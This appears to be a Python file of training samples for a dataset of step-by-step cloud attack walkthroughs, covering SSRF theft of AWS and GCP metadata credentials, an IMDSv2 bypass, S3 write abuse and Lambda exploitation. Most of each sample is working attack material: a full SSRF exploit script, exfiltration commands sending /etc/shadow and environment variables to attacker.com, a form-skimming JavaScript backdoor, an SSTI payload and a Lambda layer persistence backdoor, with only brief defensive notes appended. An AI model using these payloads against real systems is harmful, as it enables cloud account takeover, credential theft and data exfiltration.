#!/usr/bin/env python3
"""
Cloud infrastructure attack dataset:
AWS IMDS exploitation, GCP/Azure metadata, IAM escalation,
S3 misconfig, and Lambda/serverless attacks.
"""

from generate_dataset import Sample

CLOUD_ATTACK_SAMPLES = [
    # ── AWS IMDSv1 via SSRF ──────────────────────────────────────
    Sample(
        instruction="Walk through exploiting SSRF to steal AWS IAM credentials via IMDSv1 and pivot to full account compromise.",
        input="Target: AWS EC2 instance with IMDSv1 enabled; SSRF via URL parameter in web app",
        output="""## AWS IMDSv1 Exploitation via SSRF

The EC2 Instance Metadata Service (IMDS) provides credentials to code running
on the instance. IMDSv1 requires no authentication token — any SSRF gives
full credential access.

### Step 1 — Confirm SSRF & Reach IMDS

```
# Test SSRF reachability
?url=http://169.254.169.254/

# Expected response (if SSRF works):
latest/
latest/meta-data/
latest/user-data/
```

The link-local IP `169.254.169.254` is only reachable from within the EC2 instance.

### Step 2 — Enumerate IAM Role Name

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response: MyEC2Role   ← role name
```

### Step 3 — Steal Temporary Credentials

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
```

Response:
```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA1234567890ABCDEF",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FQoGZXIvYXdzEJr//////////wEaDFBX...",
  "Expiration": "2024-01-15T18:00:00Z"
}
```

### Step 4 — Configure AWS CLI with Stolen Credentials

```bash
export AWS_ACCESS_KEY_ID="ASIA1234567890ABCDEF"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FQoGZXIvYXdzEJr..."
export AWS_DEFAULT_REGION="us-east-1"
```

### Step 5 — Enumerate IAM Permissions

```bash
# Who am I?
aws sts get-caller-identity

# List attached policies
aws iam list-attached-role-policies --role-name MyEC2Role

# Check policy details
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --version-id v1
```

### Step 6 — Escalate Privileges

**If role has `iam:PassRole` + `ec2:RunInstances`:**
```bash
# Launch new EC2 with admin role
aws ec2 run-instances \
  --image-id ami-12345678 \
  --iam-instance-profile Name=AdminRole \
  --user-data '#!/bin/bash\ncurl http://attacker.com/$(cat /etc/shadow|base64)'
```

**If role has `lambda:CreateFunction` + `iam:PassRole`:**
```bash
# Create Lambda with admin role, exfiltrate secrets
aws lambda create-function \
  --function-name exfil \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --runtime python3.11 \
  --handler lambda_function.handler \
  --zip-file fileb://payload.zip
```

### Step 7 — Additional Data Collection via IMDS

```bash
# User-data may contain secrets, bootstrap scripts, passwords
?url=http://169.254.169.254/latest/user-data

# Instance identity for account ID
?url=http://169.254.169.254/latest/dynamic/instance-identity/document

# Network interfaces (internal IPs for lateral movement)
?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

### Defensive Countermeasure
- Enforce IMDSv2 (token-required): `aws ec2 modify-instance-metadata-options --http-tokens required`
- Apply IMDSv2 as an Organization SCP policy
- Use least-privilege IAM roles; avoid `iam:*` permissions
- Block SSRF at application layer: validate URLs against allowlist, use egress filtering
""",
        category="cloud",
        subcategory="aws_imds_ssrf",
    ),

    # ── AWS IMDSv2 Bypass ────────────────────────────────────────
    Sample(
        instruction="How do you bypass AWS IMDSv2 token requirements when exploiting SSRF?",
        input="Target: EC2 with IMDSv2 enforced (http-tokens=required); SSRF via redirect chain",
        output="""## Bypassing AWS IMDSv2 Token Requirement via SSRF

IMDSv2 requires a PUT request to obtain a session token before any GET requests.
Standard SSRF (GET-only) is blocked. However, certain SSRF primitives allow
sending custom headers or following redirects, enabling token theft.

### IMDSv2 Normal Flow

```bash
# Step 1: Get token (PUT request, custom header)
TOKEN=$(curl -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)

# Step 2: Use token in GET requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Bypass 1 — SSRF with PUT Method Support

If the SSRF allows arbitrary HTTP methods:
```
# Step 1: PUT to get token
POST /api/fetch?method=PUT&url=http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# Response: gQoA...token...

# Step 2: GET with token header
POST /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: gQoA...token...
```

### Bypass 2 — Open Redirect Chain

IMDSv2 enforces that requests come from the instance itself. If the app
server-side follows redirects:

```
# Host a 307 redirect on attacker server:
# GET https://attacker.com/redirect → HTTP 307 → http://169.254.169.254/latest/api/token

# Method is preserved across 307 (unlike 302)
?url=https://attacker.com/307redirect-to-imds-token

# App follows redirect with PUT method → gets IMDSv2 token
```

```python
# Attacker server (Flask)
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/get-token')
def get_token():
    return redirect(
        'http://169.254.169.254/latest/api/token',
        code=307  # Preserves PUT method
    )
```

### Bypass 3 — SSRF via Request Headers Injection

Some SSRF primitives allow injecting headers:
```
# If SSRF endpoint allows custom headers:
?url=http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Treat response as token, then:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token-from-above>
```

### Bypass 4 — Instance Using IMDSv1 Fallback

Even with `http-tokens=optional`, IMDSv1 still works:
```bash
# Check if fallback is available
curl http://169.254.169.254/latest/meta-data/
# If responds without token → IMDSv1 still active
```

### Complete Exploit via SSRF + Redirect

```python
import requests

TARGET = "https://vulnerable-app.com/fetch?url="
ATTACKER = "https://attacker.com"

# Step 1: Leak IMDSv2 token via redirect
r1 = requests.get(f"{TARGET}http://169.254.169.254/latest/api/token",
                  headers={"X-SSRF-Method": "PUT",
                           "X-aws-ec2-metadata-token-ttl-seconds": "21600"})
token = r1.text.strip()

# Step 2: List IAM roles
r2 = requests.get(f"{TARGET}http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                  headers={"X-aws-ec2-metadata-token": token})
role = r2.text.strip()

# Step 3: Steal credentials
r3 = requests.get(f"{TARGET}http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
                  headers={"X-aws-ec2-metadata-token": token})
print(r3.json())
```

### Defensive Countermeasure
- Set `http-hop-limit=1` (prevents relay through proxy layers)
- Block outbound traffic to `169.254.169.254` at VPC security group level
- Monitor CloudTrail for `AssumeRole` events with unusual source IPs
- Use VPC endpoints + disable public IMDS where possible
""",
        category="cloud",
        subcategory="aws_imdsv2_bypass",
    ),

    # ── GCP Metadata API ─────────────────────────────────────────
    Sample(
        instruction="How do you exploit SSRF to steal GCP service account tokens from the metadata API?",
        input="Target: GCP Compute Engine instance with SSRF vulnerability in web app",
        output="""## GCP Metadata API Exploitation via SSRF

GCP's metadata server at `metadata.google.internal` (169.254.169.254 on GCE)
exposes service account OAuth tokens, project info, and instance data.

### Key Difference from AWS

GCP requires the header `Metadata-Flavor: Google` on all metadata requests.
Without it, requests return HTTP 403.

```bash
# Direct access from instance:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/
```

### Step 1 — Confirm SSRF Can Set Headers

The SSRF primitive must support custom headers.

```
# If app forwards custom headers:
?url=http://metadata.google.internal/computeMetadata/v1/
Metadata-Flavor: Google
```

### Step 2 — Steal Service Account Token

```
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
```

Response:
```json
{
  "access_token": "ya29.c.b0ARBB...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

### Step 3 — Enumerate Service Account Email

```
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
Metadata-Flavor: Google
# Response: my-sa@my-project.iam.gserviceaccount.com
```

### Step 4 — Use Token to Access GCP APIs

```bash
TOKEN="ya29.c.b0ARBB..."

# List GCS buckets
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=my-project"

# Read Secrets from Secret Manager
curl -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/my-project/secrets"

# List GKE clusters
curl -H "Authorization: Bearer $TOKEN" \
  "https://container.googleapis.com/v1/projects/my-project/locations/-/clusters"
```

### Step 5 — Privilege Escalation

```bash
# Check IAM permissions (what can this SA do?)
gcloud auth activate-service-account --access-token="$TOKEN"
gcloud projects get-iam-policy my-project

# If SA has roles/iam.serviceAccountTokenCreator → impersonate other SAs
gcloud iam service-accounts generate-access-token admin-sa@my-project.iam.gserviceaccount.com
```

### Additional Valuable Endpoints

```
# Project metadata (project ID, numeric ID)
/computeMetadata/v1/project/project-id
/computeMetadata/v1/project/numeric-project-id

# Instance attributes (may contain secrets in startup scripts)
/computeMetadata/v1/instance/attributes/

# SSH keys
/computeMetadata/v1/project/attributes/ssh-keys
/computeMetadata/v1/instance/attributes/ssh-keys

# Kubernetes node credentials (if GKE)
/computeMetadata/v1/instance/attributes/kube-env
```

### Defensive Countermeasure
- Assign minimal IAM roles to Compute Engine service accounts
- Enable Workload Identity for GKE (avoids node SA token exposure)
- Use `metadata-from-safe-subnet` firewall rule to block cross-pod SSRF
- Audit with: `gcloud asset search-all-iam-policies --scope=projects/PROJECT`
""",
        category="cloud",
        subcategory="gcp_metadata_ssrf",
    ),

    # ── S3 Bucket Misconfiguration ───────────────────────────────
    Sample(
        instruction="How do you discover and exploit S3 bucket misconfigurations for data exfiltration and RCE?",
        input="Target: web application hosted on AWS; static assets served from S3",
        output="""## S3 Bucket Misconfiguration — Discovery to RCE

Misconfigured S3 buckets can leak sensitive data, allow arbitrary file uploads,
and in some cases enable RCE through static website hosting or upload-to-execute chains.

### Step 1 — Bucket Name Discovery

```bash
# From web app source code
curl -s https://target.com | grep -oE 'https?://[a-z0-9-]+\.s3[^"]+' | sort -u

# Common patterns
target-com-assets.s3.amazonaws.com
target-backups.s3.us-east-1.amazonaws.com
dev-target-com.s3.amazonaws.com
staging-target.s3.amazonaws.com

# Subdomain enumeration
subfinder -d target.com | grep s3
amass enum -d target.com | grep s3

# DNS brute force
for prefix in backup logs data static assets dev staging; do
  nslookup ${prefix}-target.s3.amazonaws.com
done
```

### Step 2 — Check Public Read Access

```bash
# List bucket contents (unauthenticated)
aws s3 ls s3://target-com-assets --no-sign-request

# Download all files
aws s3 sync s3://target-com-assets ./loot --no-sign-request

# Check for sensitive files
aws s3 ls s3://target-backups --no-sign-request --recursive | grep -iE "\.sql|\.bak|\.env|password|secret|key|\.pem|\.pfx"
```

### Step 3 — Check Public Write Access

```bash
# Test write permission
echo "test" | aws s3 cp - s3://target-com-assets/pwned.txt --no-sign-request
# If succeeds → public write enabled!
```

### Step 4 — Exploit Public Write

**Backdoor JS files (Supply Chain Attack)**:
```bash
# Overwrite existing JS file with backdoor
cat > payload.js << 'EOF'
// Original content here...
// Injected: steal credentials
document.addEventListener('DOMContentLoaded', function() {
  var forms = document.querySelectorAll('form');
  forms.forEach(function(form) {
    form.addEventListener('submit', function(e) {
      var data = new FormData(form);
      fetch('https://attacker.com/steal', {method:'POST',body:data});
    });
  });
});
EOF

aws s3 cp payload.js s3://target-com-assets/js/app.js --no-sign-request
```

**HTML injection for phishing**:
```bash
aws s3 cp fake-login.html s3://target-com-assets/login.html --no-sign-request
# If bucket has static website hosting → served at http://target-com-assets.s3-website.amazonaws.com/login.html
```

### Step 5 — Escalation via Bucket Policy Files

Some apps store sensitive config in S3:
```bash
# Common sensitive file paths
aws s3 cp s3://target-backups/.env . --no-sign-request
aws s3 cp s3://target-backups/database.yml . --no-sign-request
aws s3 cp s3://target-backups/config/secrets.json . --no-sign-request

# Terraform state files often contain all infrastructure secrets
aws s3 cp s3://target-terraform-state/terraform.tfstate . --no-sign-request
# Contains: DB passwords, API keys, private keys
```

### Automation Tools

```bash
# S3Scanner
python3 s3scanner.py --buckets buckets.txt

# Bucket Finder
ruby bucket_finder.rb wordlist.txt

# aws-s3-finder
aws-s3-finder -d target.com

# truffleHog for secrets in bucket content
trufflehog s3 --bucket=target-backups
```

### Defensive Countermeasure
- Enable S3 Block Public Access at account level (AWS Organizations SCP)
- Audit with: `aws s3api get-bucket-acl --bucket BUCKET`
- Enable S3 access logging and CloudTrail data events
- Use S3 Object Ownership: `BucketOwnerEnforced` (disables ACLs)
- Regularly scan with AWS Trusted Advisor + Security Hub
""",
        category="cloud",
        subcategory="s3_misconfiguration",
    ),

    # ── Lambda / Serverless Attacks ──────────────────────────────
    Sample(
        instruction="What attack vectors exist in AWS Lambda functions and how do you exploit environment variable leakage?",
        input="Target: AWS Lambda function exposed via API Gateway; SSRF or code injection vulnerability exists",
        output="""## AWS Lambda Attack Surface & Environment Variable Exfiltration

Lambda functions run in managed containers with access to IAM execution roles
and sensitive environment variables. Any code execution or SSRF primitive
inside Lambda leads to full credential exfiltration.

### Lambda Attack Surface

1. **Environment variables** — DB passwords, API keys, secrets
2. **IAM execution role** — same as EC2 IMDS exploitation
3. **/tmp directory** — ephemeral storage, may contain cached data
4. **Lambda runtime files** — source code, dependencies
5. **VPC access** — Lambda in VPC can reach internal services
6. **Event data injection** — malicious input in trigger events

### Step 1 — Exploit Code Injection / SSRF in Lambda

If Lambda has SSRF or RCE (via SSTI, deserialization, etc.):

```python
# SSTI payload targeting Lambda runtime (Python/Jinja2)
{{ config.__class__.__init__.__globals__['os'].environ }}
```

This dumps ALL environment variables including:
```
AWS_ACCESS_KEY_ID=ASIA...
AWS_SECRET_ACCESS_KEY=...
AWS_SESSION_TOKEN=...
AWS_LAMBDA_FUNCTION_NAME=my-function
DATABASE_URL=postgresql://admin:p@ssw0rd@db.internal:5432/prod
STRIPE_SECRET_KEY=sk_live_...
```

### Step 2 — Access IMDS from Lambda (in VPC)

Lambda in VPC doesn't have direct IMDS access, but has IAM credentials
via AWS SDK automatically. If not in VPC:

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Lambda execution role credentials are also available via:
```
?url=http://169.254.170.2/v2/credentials/{AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```

This endpoint provides credentials via the ECS credential provider used by Lambda.

### Step 3 — Read Lambda Source Code

```bash
# From stolen credentials
aws lambda get-function --function-name my-function
# Response includes a pre-signed URL to download deployment package

# Download and extract
curl -o function.zip "<pre-signed-url>"
unzip function.zip
cat lambda_function.py  # Source code + hardcoded secrets
```

### Step 4 — Exfiltrate Sensitive Lambda Resources

```bash
# List all Lambda functions
aws lambda list-functions --region us-east-1

# Get all environment variables
aws lambda get-function-configuration \
  --function-name my-function \
  | jq '.Environment.Variables'

# Get event source mappings (reveals connected Kinesis/SQS/DynamoDB)
aws lambda list-event-source-mappings
```

### Step 5 — Persistence via Lambda Layer Backdoor

```bash
# Create malicious layer that phones home
aws lambda publish-layer-version \
  --layer-name backdoor \
  --zip-file fileb://malicious_layer.zip

# Attach to existing function
aws lambda update-function-configuration \
  --function-name target-function \
  --layers arn:aws:lambda:us-east-1:123456789:layer:backdoor:1
```

### Lambda Exploitation via Event Injection

If Lambda processes user-controlled data:
```python
# If Lambda does: eval(event['expression'])
# Payload in API request:
{"expression": "__import__('os').system('curl http://attacker.com/$(env|base64 -w0)')"}
```

### Defensive Countermeasure
- Use AWS Secrets Manager instead of environment variables for secrets
- Apply least-privilege execution roles
- Enable Lambda code signing (prevent unauthorized layer attachment)
- Use VPC + security groups to restrict Lambda network access
- Monitor with GuardDuty + CloudTrail: alert on `GetFunctionConfiguration` by unexpected principals
""",
        category="cloud",
        subcategory="lambda_exploitation",
    ),
]
